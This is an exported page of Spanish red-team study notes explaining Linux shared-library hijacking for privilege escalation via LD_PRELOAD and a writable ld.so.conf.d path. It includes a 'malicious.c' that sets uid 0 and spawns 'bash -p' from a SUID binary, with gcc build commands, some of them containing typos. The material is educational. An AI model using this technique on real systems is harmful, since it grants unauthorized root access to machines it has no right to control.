<!DOCTYPE html> <html><head>
		<title>Secuestro de la biblioteca de objetos compartidos enlazados dinámicamente</title>
		<base href="..\..\..\..\..\..\..\../">
		<meta id="root-path" root-path="..\..\..\..\..\..\..\../">
		<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, minimum-scale=1.0, maximum-scale=5.0">
		<meta charset="UTF-8">
		<meta name="description" content="Hacking - Secuestro de la biblioteca de objetos compartidos enlazados dinámicamente">
		<meta property="og:title" content="Secuestro de la biblioteca de objetos compartidos enlazados dinámicamente">
		<meta property="og:description" content="Hacking - Secuestro de la biblioteca de objetos compartidos enlazados dinámicamente">
		<meta property="og:type" content="website">
		<meta property="og:url" content="notes/4.-cybersecurity/redteam/pentesting/systems/2.-fases-auditoria/3.-escalada-de-privilegios/linux/secuestro-de-la-biblioteca-de-objetos-compartidos-enlazados-dinámicamente.html">
		<meta property="og:image" content="undefined">
		<meta property="og:site_name" content="Hacking">
		<link rel="alternate" type="application/rss+xml" title="RSS Feed" href="lib/rss.xml"><script async="" id="webpage-script" src="lib/scripts/webpage.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><script type="module" async="" id="graph-view-script" src="lib/scripts/graph-view.js"></script><script async="" id="graph-wasm-script" src="lib/scripts/graph-wasm.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><script async="" id="graph-render-worker-script" src="lib/scripts/graph-render-worker.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><script async="" id="tinycolor-script" src="lib/scripts/tinycolor.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><script async="" id="pixi-script" src="https://cdnjs.cloudflare.com/ajax/libs/pixi.js/7.4.0/pixi.min.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><script async="" id="minisearch-script" src="https://cdn.jsdelivr.net/npm/minisearch@6.3.0/dist/umd/index.min.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><link rel="icon" href="lib/media/favicon.png"><script async="" id="graph-data-script" src="lib/scripts/graph-data.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><style>body{--line-width:40em;--line-width-adaptive:40em;--file-line-width:40em;--sidebar-width:min(20em, 80vw);--collapse-arrow-size:11px;--tree-horizontal-spacing:0.6em;--tree-vertical-spacing:0.6em;--sidebar-margin:12px}.sidebar{height:100%;min-width:calc(var(--sidebar-width) + var(--divider-width-hover));max-width:calc(var(--sidebar-width) + var(--divider-width-hover));font-size:14px;z-index:10;position:relative;overflow:hidden;transition:min-width ease-in-out,max-width ease-in-out;transition-duration:.2s;contain:size}.sidebar-left{left:0}.sidebar-right{right:0}.sidebar.is-collapsed{min-width:0;max-width:0}body.floating-sidebars .sidebar{position:absolute}.sidebar-content{height:100%;min-width:calc(var(--sidebar-width) - var(--divider-width-hover));top:0;padding:var(--sidebar-margin);padding-top:4em;line-height:var(--line-height-tight);background-color:var(--background-secondary);transition:background-color,border-right,border-left,box-shadow;transition-duration:var(--color-fade-speed);transition-timing-function:ease-in-out;position:absolute;display:flex;flex-direction:column}.sidebar:not(.is-collapsed) .sidebar-content{min-width:calc(max(100%,var(--sidebar-width)) - 3px);max-width:calc(max(100%,var(--sidebar-width)) - 3px)}.sidebar-left .sidebar-content{left:0;border-top-right-radius:var(--radius-l);border-bottom-right-radius:var(--radius-l)}.sidebar-right .sidebar-content{right:0;border-top-left-radius:var(--radius-l);border-bottom-left-radius:var(--radius-l)}.sidebar:has(.sidebar-content:empty):has(.topbar-content:empty){display:none}.sidebar-topbar{height:2em;width:var(--sidebar-width);top:var(--sidebar-margin);padding-inline:var(--sidebar-margin);z-index:1;position:fixed;display:flex;align-items:center;transition:width ease-in-out;transition-duration:inherit}.sidebar.is-collapsed .sidebar-topbar{width:calc(2.3em + var(--sidebar-margin) * 2)}.sidebar .sidebar-topbar.is-collapsed{width:0}.sidebar-left .sidebar-topbar{left:0}.sidebar-right .sidebar-topbar{right:0}.topbar-content{overflow:hidden;overflow:clip;width:100%;height:100%;display:flex;align-items:center;transition:inherit}.sidebar.is-collapsed .topbar-content{width:0;transition:inherit}.clickable-icon.sidebar-collapse-icon{background-color:transparent;color:var(--icon-color-focused);padding:0!important;margin:0!important;height:100%!important;width:2.3em!important;margin-inline:0.14em!important;position:absolute}.sidebar-left .clickable-icon.sidebar-collapse-icon{transform:rotateY(180deg);right:var(--sidebar-margin)}.sidebar-right .clickable-icon.sidebar-collapse-icon{transform:rotateY(180deg);left:var(--sidebar-margin)}.clickable-icon.sidebar-collapse-icon svg.svg-icon{width:100%;height:100%}.sidebar-section-header{margin:0 0 1em 0;text-transform:uppercase;letter-spacing:.06em;font-weight:600}body{transition:background-color var(--color-fade-speed) ease-in-out}.webpage-container{display:flex;flex-direction:row;height:100%;width:100%;align-items:stretch;justify-content:center}.document-container{opacity:1;flex-basis:100%;max-width:100%;width:100%;height:100%;display:flex;flex-direction:column;align-items:center;transition:opacity .2s ease-in-out;contain:inline-size}.hide{opacity:0;transition:opacity .2s ease-in-out}.document-container>.markdown-preview-view{margin:var(--sidebar-margin);margin-bottom:0;width:100%;width:-webkit-fill-available;width:-moz-available;width:fill-available;background-color:var(--background-primary);transition:background-color var(--color-fade-speed) ease-in-out;border-top-right-radius:var(--window-radius,var(--radius-m));border-top-left-radius:var(--window-radius,var(--radius-m));overflow-x:hidden!important;overflow-y:auto!important;display:flex!important;flex-direction:column!important;align-items:center!important;contain:inline-size}.document-container>.markdown-preview-view>.markdown-preview-sizer{padding-bottom:80vh!important;width:100%!important;max-width:var(--line-width)!important;flex-basis:var(--line-width)!important;transition:background-color var(--color-fade-speed) ease-in-out;contain:inline-size}.markdown-rendered img:not([width]),.view-content img:not([width]){max-width:100%;outline:0}.document-container>.view-content.embed{display:flex;padding:1em;height:100%;width:100%;align-items:center;justify-content:center}.document-container>.view-content.embed>*{max-width:100%;max-height:100%;object-fit:contain}:has(> :is(.math,table)){overflow-x:auto!important}.document-container>.view-content{overflow-x:auto;contain:content;padding:0;margin:0;height:100%}.scroll-highlight{position:absolute;width:100%;height:100%;pointer-events:none;z-index:1000;background-color:hsla(var(--color-accent-hsl),.25);opacity:0;padding:1em;inset:50%;translate:-50% -50%;border-radius:var(--radius-s)}</style><script defer="">async function loadIncludes(){if("file:"!=location.protocol){let e=document.querySelectorAll("include");for(let t=0;t<e.length;t++){let o=e[t],l=o.getAttribute("src");try{const e=await fetch(l);if(!e.ok){console.log("Could not include file: "+l),o?.remove();continue}let t=await e.text(),n=document.createRange().createContextualFragment(t),i=Array.from(n.children);for(let e of i)e.classList.add("hide"),e.style.transition="opacity 0.5s ease-in-out",setTimeout((()=>{e.classList.remove("hide")}),10);o.before(n),o.remove(),console.log("Included file: "+l)}catch(e){o?.remove(),console.log("Could not include file: "+l,e);continue}}}else{if(document.querySelectorAll("include").length>0){var e=document.createElement("div");e.id="error",e.textContent="Web server exports must be hosted on an http / web server to be viewed correctly.",e.style.position="fixed",e.style.top="50%",e.style.left="50%",e.style.transform="translate(-50%, -50%)",e.style.fontSize="1.5em",e.style.fontWeight="bold",e.style.textAlign="center",document.body.appendChild(e),document.querySelector(".document-container")?.classList.remove("hide")}}}document.addEventListener("DOMContentLoaded",(()=>{loadIncludes()}));let isFileProtocol="file:"==location.protocol;function waitLoadScripts(e,t){let o=e.map((e=>document.getElementById(e+"-script"))),l=0;!function e(){let n=o[l];l++,n&&"true"!=n.getAttribute("loaded")||l<o.length&&e(),l<o.length?n.addEventListener("load",e):t()}()}</script><link rel="stylesheet" href="lib/styles/obsidian.css"><link rel="stylesheet" href="lib/styles/theme.css"><link rel="preload" href="lib/styles/global-variable-styles.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><noscript><link rel="stylesheet" href="lib/styles/global-variable-styles.css"></noscript><link rel="preload" href="lib/styles/main-styles.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><noscript><link rel="stylesheet" href="lib/styles/main-styles.css"></noscript></head><body class="publish css-settings-manager theme-dark show-inline-title"><script defer="">let theme=localStorage.getItem("theme")||(window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light");"dark"==theme?(document.body.classList.add("theme-dark"),document.body.classList.remove("theme-light")):(document.body.classList.add("theme-light"),document.body.classList.remove("theme-dark")),window.innerWidth<480?document.body.classList.add("is-phone"):window.innerWidth<768?document.body.classList.add("is-tablet"):window.innerWidth<1024?document.body.classList.add("is-small-screen"):document.body.classList.add("is-large-screen")</script><div class="webpage-container workspace"><div class="sidebar-left sidebar"><div class="sidebar-handle"></div><div class="sidebar-topbar"><div class="topbar-content"><label class="theme-toggle-container" for="theme_toggle"><input class="theme-toggle-input" type="checkbox" id="theme_toggle"><div class="toggle-background"></div></label></div><div class="clickable-icon sidebar-collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" class="svg-icon"><path d="M21 3H3C1.89543 3 1 3.89543 1 5V19C1 20.1046 1.89543 21 3 21H21C22.1046 21 23 20.1046 23 19V5C23 3.89543 22.1046 3 21 3Z"></path><path d="M10 4V20"></path><path d="M4 7H7"></path><path d="M4 10H7"></path><path d="M4 13H7"></path></svg></div></div><div class="sidebar-content"><div class="search-input-container"><input enterkeyhint="search" type="search" spellcheck="false" placeholder="Search..."><div class="search-input-clear-button" aria-label="Clear search"></div></div><include src="lib/html/file-tree.html"></include></div><script defer="">let ls = document.querySelector(".sidebar-left"); ls.classList.add("is-collapsed"); if (window.innerWidth > 768) ls.classList.remove("is-collapsed"); ls.style.setProperty("--sidebar-width", localStorage.getItem("sidebar-left-width"));</script></div><div class="document-container markdown-reading-view hide"><div class="markdown-preview-view markdown-rendered allow-fold-headings allow-fold-lists is-readable-line-width"><style id="MJX-CHTML-styles"></style><div class="markdown-preview-sizer markdown-preview-section"><h1 class="page-title heading inline-title" id="Secuestro de la biblioteca de objetos compartidos enlazados dinámicamente"><p>Secuestro de la biblioteca de objetos compartidos enlazados dinámicamente</p></h1><div><hr></div><div><ul>
<li data-line="0">Tags: <a href="?query=tag:escalada" class="tag" target="_blank" rel="noopener">#escalada</a> <a href="?query=tag:teoria" class="tag" target="_blank" rel="noopener">#teoria</a> <a href="?query=tag:practica" class="tag" target="_blank" rel="noopener">#practica</a> </li>
</ul></div><div><hr></div><div class="heading-wrapper"><div class="heading-children"><div><p>Las <strong>bibliotecas compartidas</strong> son archivos que contiene funciones y recursos utilizados por múltiples programas. Cuando un programa requiere una función de una biblioteca compartida, el sistema operativo busca la biblioteca y enlaza dinámica mente la función requerida durante la ejecución del programa. Sin embargo, si el sistema no encuentra la biblioteca en las rutas predeterminadas, puede buscarla en otros directorios. </p></div><div><p>Un atacante puede aprovechar esta situación creando una <strong>biblioteca compartida maliciosa</strong> con el mismo nombre que la biblioteca legítima y colocándola en un directorio donde el sistema la buscará. Cuando el programa intenta cargar la biblioteca, el sistema cargara la versión malicioso en lugar de la legítima, permitiendo al atacante ejecutar código malicioso con los privilegios del programa víctima. </p></div></div></div><div class="heading-wrapper"><h1 data-heading="Escalada" class="heading" id="Escalada">Escalada</h1><div class="heading-children"><div><p>Para ver las funciones que se usan en un script de una biblioteca de objetos compartida podríamos hacer uso del comando <strong>ldd</strong> o de de un script llamado <a data-tooltip-position="top" aria-label="https://github.com/namhyung/uftrace" rel="noopener" class="external-link" href="https://github.com/namhyung/uftrace" target="_blank">uftrace</a> (Utilizado para analizar la ejecución de un programa escrito en C/C++) para leer las mismas...</p></div><div><pre class="language-bash" tabindex="0"><code class="language-bash is-loaded">ldd <span class="token punctuation">{</span>binary<span class="token punctuation">}</span>

uftrace --force -a <span class="token punctuation">{</span>binary<span class="token punctuation">}</span>
</code><button class="copy-code-button">Copy</button></pre></div><div><p>Una vez que tengamos las funciones que se usan, por ejemplo del script: </p></div><div><pre class="language-c" tabindex="0"><code class="language-c is-loaded"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;time.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token keyword">const</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">srand</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span> 
<span class="token punctuation">}</span>
</code><button class="copy-code-button">Copy</button></pre></div><div><pre class="language-bash" tabindex="0"><code class="language-bash is-loaded">uftrace --force -a <span class="token punctuation">{</span>binary<span class="token punctuation">}</span>
<span class="token comment"># 1838698392</span>
<span class="token comment"># DURATION     TID     FUNCTION</span>
<span class="token comment">#   5.840 us [110824] | time();</span>
<span class="token comment">#   1.308 us [110824] | srand();</span>
<span class="token comment">#   0.433 us [110824] | rand();</span>
<span class="token comment"># 206.138 us [110824] | printf("%d\n") = 11;</span>
</code><button class="copy-code-button">Copy</button></pre></div><div><p>Vemos que se nos listan las funciones utilizadas en el script, por lo que ahora intentando realizar un secuestro de la biblioteca de objetos compartidos enlazados dinámicamente podríamos replicar la función <em>"rand"</em> que se usa en el script para realizar un código que nos interese. </p></div><div><p>Por lo que para poder realizar esta "suplantación" de función, las firmas deben coincidir (Las firmas son el conjunto de lo que la función <strong>retorna</strong>, como se <strong>llama</strong> y los <strong>argumentos</strong> que recibe)</p></div><div><p>Es decir, a la hora de ejecutar el binario, por detrás el enlazador dinámico  por detrás carga las bibliotecas compartidas necesarias para que este programa funcione correctamente, ahora, este enlazador dinámico lo que hace es tomar como prioritario una <strong>variable de entorno</strong> llamada <strong>LD_PRELOAD</strong>, por lo que si esta variable lo igualamos a un binario de una biblioteca compartida que hayamos creado previamente, podríamos manipular el código para que se ejecute las instrucciones que quisiéramos.</p></div><div><pre class="language-c" tabindex="0"><code class="language-c is-loaded"><span class="token keyword">int</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
	<span class="token keyword">return</span> <span class="token number">777</span><span class="token punctuation">;</span> 
<span class="token punctuation">}</span>
</code><button class="copy-code-button">Copy</button></pre></div><div><p>Una vez creado el código malicioso (En este ejemplo alteramos el binario original para que en lugar de retornar un número random retorne siempre <em>777</em>) simplemente falta compilarlo como <strong>biblioteca compartida</strong> con el comando <strong>gcc -shared -fPIC {file.c} -o {binary_name}</strong> y exportar la variable de entorno. </p></div><div><pre class="language-bash" tabindex="0"><code class="language-bash is-loaded">gcc -shared -fPIC malicious.c -o randomname 

<span class="token assign-left variable">LD_PRELOAD</span><span class="token operator">=</span>randomname ./<span class="token punctuation">{</span>binary<span class="token punctuation">}</span>
</code><button class="copy-code-button">Copy</button></pre></div><div><hr></div><div><p>Otro ejemplo un poco más complejo es el siguiente. </p></div><div><p>Tenemos un binario en la ruta <strong>/usr/bin/welcome</strong> el cual no se puede ejecutar por un error y es SUID. El error que nos tira es <em>"libwelcome.so: cannot open shared object file: No such file or directory"</em>. </p></div><div><p>En este caso si jugamos con <strong>ldd /usr/bin/welcome</strong> nos devuelve <strong>libwelcome.so =&gt; not found</strong> y en este caso si intentamos explotar este secuestro de la biblioteca con con la variable <em>LD_PRELOAD</em> no va a funcionar.</p></div><div><p>En estas ocasiones tenemos otras vías, la primera, es ver si tenemos permisos de escritura en la ruta <strong>/etc/ld.so.conf.d</strong> para crear una archivo de configuración para indicar a que ruta tiene que ir el binario para encontrar la biblioteca en cuestión. También podemos ver a que rutas se dirige a la hora de buscar dicho recurso en las configuraciones. </p></div><div><p>En el ejemplo dado, el binario nos arroja error dado que no encuentra la ruta, por lo que vemos que dentro de la ruta <strong>/etc/ld.so.conf.d</strong> existe un archivo de configuración llamado <em>custom.conf</em> el cual contiene una ruta inexistente como "<em>/home/dobliuw/lib</em>", pero en el home del user dobliuw no existe la carpeta <em>lib</em>, por lo que podríamos crear la carpeta y así mismo el script en c malicioso para <strong>convertirlo</strong> en una <strong>biblioteca compartida</strong>. </p></div><div><pre class="language-bash" tabindex="0"><code class="language-bash is-loaded"><span class="token builtin class-name">cd</span> /home/dobliuw 

<span class="token function">mkdir</span> lib 

<span class="token builtin class-name">cd</span> <span class="token operator">!</span>$ 

<span class="token function">nano</span> malicious.c 
</code><button class="copy-code-button">Copy</button></pre></div><div class="heading-wrapper"><h4 data-heading="malicious.c" class="heading" id="malicious.c"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>malicious.c</h4><div class="heading-children"><div><pre class="language-c" tabindex="0"><code class="language-c is-loaded"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">inlcude</span> <span class="token expression"><span class="token operator">&lt;</span>stdio<span class="token punctuation">.</span>h<span class="token operator">&gt;</span> </span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h&gt;</span></span>

<span class="token keyword">int</span> <span class="token function">welcome</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
	<span class="token function">setuid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">setgid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"bash -p"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code><button class="copy-code-button">Copy</button></pre></div></div></div><div class="heading-wrapper"><h4 data-heading="PD: La función se llama welcome ya que podríamos ponerle un nombre típico como main y al compilar el binario como biblioteca compartida y ejecutar el binario inicial nos arrojaría un warning de que no se encuentra la función &quot;welcome&quot; de la librería, por lo que nos da a entender que la función que se usa es welcome." class="heading" id="PD:_La_función_se_llama_welcome_ya_que_podríamos_ponerle_un_nombre_típico_como_main_y_al_compilar_el_binario_como_biblioteca_compartida_y_ejecutar_el_binario_inicial_nos_arrojaría_un_warning_de_que_no_se_encuentra_la_función_&quot;welcome&quot;_de_la_librería,_por_lo_que_nos_da_a_entender_que_la_función_que_se_usa_es_welcome."><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>PD: La función se llama welcome ya que podríamos ponerle un nombre típico como main y al compilar el binario como biblioteca compartida y ejecutar el binario inicial nos arrojaría un warning de que no se encuentra la función "welcome" de la librería, por lo que nos da a entender que la función que se usa es welcome.</h4><div class="heading-children"><div><p>Ahora solo quedaría convertir dicho script en un binario de <strong>biblioteca compartida</strong> con <code>gcc -shared -fPIC malicious.c libwelcome.so</code>. </p></div><div><p>Por lo que ahora al ejecutar el binario inicial (<em>/usr/bin/welcome</em>) al contener permisos SUID y habiendo <em>secuestrado la biblioteca de objetos compartidos enlazados dinámicamente</em> con un script el cual setea el uid en 0 para asegurarnos ser root nos lanzaría una consola privilegiada como root. </p></div><div class="mod-footer"></div></div></div></div></div></div></div></div><div class="sidebar-right sidebar"><div class="sidebar-handle"></div><div class="sidebar-topbar"><div class="topbar-content"></div><div class="clickable-icon sidebar-collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" class="svg-icon"><path d="M21 3H3C1.89543 3 1 3.89543 1 5V19C1 20.1046 1.89543 21 3 21H21C22.1046 21 23 20.1046 23 19V5C23 3.89543 22.1046 3 21 3Z"></path><path d="M10 4V20"></path><path d="M4 7H7"></path><path d="M4 10H7"></path><path d="M4 13H7"></path></svg></div></div><div class="sidebar-content"><div class="graph-view-wrapper"><div class="sidebar-section-header">Interactive Graph</div><div class="graph-view-placeholder">
		<div class="graph-view-container">
			<div class="graph-icon graph-expand" role="button" aria-label="Expand" data-tooltip-position="top"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon"><line x1="7" y1="17" x2="17" y2="7"></line><polyline points="7 7 17 7 17 17"></polyline></svg></div>
			<canvas id="graph-canvas" class="hide" width="512px" height="512px"></canvas>
		</div>
		</div></div><div class="tree-container mod-root nav-folder tree-item outline-tree" data-depth="0"><div class="tree-header"><span class="sidebar-section-header">Table Of Contents</span><button class="clickable-icon collapse-tree-button" aria-label="Collapse All"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></svg></button></div><div class="tree-scroll-area tree-item-children nav-folder-children"><div class="tree-item mod-tree-folder nav-folder mod-collapsible is-collapsed" style="display: none;"></div><div class="tree-item" data-depth="1"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\systems\2.-fases-auditoria\3.-escalada-de-privilegios\linux\secuestro-de-la-biblioteca-de-objetos-compartidos-enlazados-dinámicamente.html#Secuestro de la biblioteca de objetos compartidos enlazados dinámicamente"><div class="tree-item-contents heading-link" heading-name="Secuestro de la biblioteca de objetos compartidos enlazados dinámicamente"><span class="tree-item-title">Secuestro de la biblioteca de objetos compartidos enlazados dinámicamente</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="1"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\systems\2.-fases-auditoria\3.-escalada-de-privilegios\linux\secuestro-de-la-biblioteca-de-objetos-compartidos-enlazados-dinámicamente.html#Escalada"><div class="tree-item-contents heading-link" heading-name="Escalada"><span class="tree-item-title">Escalada</span></div></a><div class="tree-item-children nav-folder-children"><div class="tree-item" data-depth="4"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\systems\2.-fases-auditoria\3.-escalada-de-privilegios\linux\secuestro-de-la-biblioteca-de-objetos-compartidos-enlazados-dinámicamente.html#malicious.c"><div class="tree-item-contents heading-link" heading-name="malicious.c"><span class="tree-item-title">malicious.c</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="4"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\systems\2.-fases-auditoria\3.-escalada-de-privilegios\linux\secuestro-de-la-biblioteca-de-objetos-compartidos-enlazados-dinámicamente.html#PD:_La_función_se_llama_welcome_ya_que_podríamos_ponerle_un_nombre_típico_como_main_y_al_compilar_el_binario_como_biblioteca_compartida_y_ejecutar_el_binario_inicial_nos_arrojaría_un_warning_de_que_no_se_encuentra_la_función_&quot;welcome&quot;_de_la_librería,_por_lo_que_nos_da_a_entender_que_la_función_que_se_usa_es_welcome."><div class="tree-item-contents heading-link" heading-name="PD: La función se llama welcome ya que podríamos ponerle un nombre típico como main y al compilar el binario como biblioteca compartida y ejecutar el binario inicial nos arrojaría un warning de que no se encuentra la función &quot;welcome&quot; de la librería, por lo que nos da a entender que la función que se usa es welcome."><span class="tree-item-title">PD: La función se llama welcome ya que podríamos ponerle un nombre típico como main y al compilar el binario como biblioteca compartida y ejecutar el binario inicial nos arrojaría un warning de que no se encuentra la función "welcome" de la librería, por lo que nos da a entender que la función que se usa es welcome.</span></div></a><div class="tree-item-children nav-folder-children"></div></div></div></div></div></div></div><script defer="">let rs = document.querySelector(".sidebar-right"); rs.classList.add("is-collapsed"); if (window.innerWidth > 768) rs.classList.remove("is-collapsed"); rs.style.setProperty("--sidebar-width", localStorage.getItem("sidebar-right-width"));</script></div></div></body></html>